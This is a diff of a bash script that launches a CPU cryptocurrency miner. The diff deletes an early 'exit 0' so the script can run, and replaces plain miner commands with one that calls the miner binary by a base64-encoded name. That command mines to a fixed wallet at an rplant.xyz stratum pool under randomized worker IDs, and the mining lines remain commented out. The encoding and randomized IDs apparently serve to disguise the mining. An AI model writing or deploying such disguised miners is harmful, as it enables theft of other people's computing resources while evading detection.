@@ -1,6 +1,6 @@
 #!/bin/bash
 
-exit 0
+
 
 jam2digit=$(date -u +%H)
 jam1digit=$((10#$jam2digit))
@@ -42,11 +42,7 @@ fi
 #
 
 #while [ 1 ]; do
-#echo 'index'
-#./cpuminer-sse2 -a yespowerSUGAR -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1q6dsvfpf6palnwsel8g6q2ljzft2yj57tt0dsds.MujurID128
-#./cpuminer-sse2 -a yespowerSUGAR -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1q6dsvfpf6palnwsel8g6q2ljzft2yj57tt0dsds.MujurID$(( $RANDOM % 99 + 1 ))
-#sleep 5
-#echo 'index'
+#./Y3B1bWluZXItc3NlMg -a yespowerSUGAR -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1q6dsvfpf6palnwsel8g6q2ljzft2yj57tt0dsds.MujurID$(( $RANDOM % 99 + 1 ))
 #done
 
 #echo 'index'
